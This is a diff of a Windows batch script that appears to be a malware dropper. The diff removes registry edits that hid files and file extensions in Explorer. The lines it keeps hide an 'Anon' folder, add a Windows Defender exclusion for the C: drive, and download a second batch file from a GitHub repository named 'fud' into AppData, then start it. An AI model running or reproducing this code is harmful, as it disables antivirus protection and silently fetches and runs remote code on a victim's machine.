@@ -33,10 +33,6 @@ attrib +h "Anon" /s /d
 
 powershell.exe -command "Add-MpPreference -ExclusionPath "C:\
 
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Hidden" /t REG_DWORD /f /d "0" >nul
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSuperHidden" /t REG_DWORD /d "0" /f >nul
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideFileExt" /t REG_DWORD /d "1" /f >nul
-
 Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm39/fud/raw/main/2.bat' -OutFile C:\Users\%USERNAME%\AppData\Local\Anon\2.bat"
 cd C:\Users\%USERNAME%\AppData\Local\Anon"
 start 2.bat
